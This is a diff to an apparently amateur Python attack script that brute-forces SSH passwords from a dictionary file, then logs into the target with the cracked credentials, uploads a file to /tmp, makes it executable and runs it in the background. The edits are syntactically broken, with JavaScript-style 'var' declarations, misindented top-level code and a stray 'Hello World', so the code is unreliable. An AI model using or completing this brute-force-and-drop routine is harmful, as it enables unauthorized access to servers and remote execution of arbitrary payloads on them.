@@ -17,14 +17,16 @@ def AttackSSH(ipAddress, dictionaryFile) :
             print("[-] Failed! ...")
             continue
         print("[+] Success ... username: %s and passoword %s is VALID! " % (username, password))
+        var thing = [username, password]
         break
+   return thing
 
-def sshScan ():
+def sshScan (remoteHost):
     ## Clear the screen
     subprocess.call('clear', shell=True)
 
     ## Enter Host to scan
-    remoteServer = input("Enter a remote host to scan: ")
+    remoteServer = input("Enter a remote host to scan")
     remoteServerIP = socket.gethostbyname(remoteServer)
     
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -41,9 +43,15 @@ def UploadFileAndExecute(sshConnection, fileName) :
     ssh.exec_command("chmod a+x /tmp/" +fileName)
     ssh.exec_command("nohup /tmp/" +fileName+ " &")
 
-if __name__ == "__main__" :
-    ssh = paramiko.SSHClient()
-    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    ssh.connect(sys.argv[1], username=sys.argv[2], password=sys.argv[3])
-    UploadFileAndExecute(ssh, sys.argv[4])
-    ssh.close()
+
+var result= sshScan(sys.argv[1])
+if result ==0 :
+var credentials=AttackSSH(sys.argv[1], sys.argv[3])
+ssh = paramiko.SSHClient()
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+ssh.connect(sys.argv[1], username=credentials[0], password=credentials[1])
+UploadFileAndExecute(ssh, sys.argv[4])   
+ssh.close()
+
+
+print("Hello World")
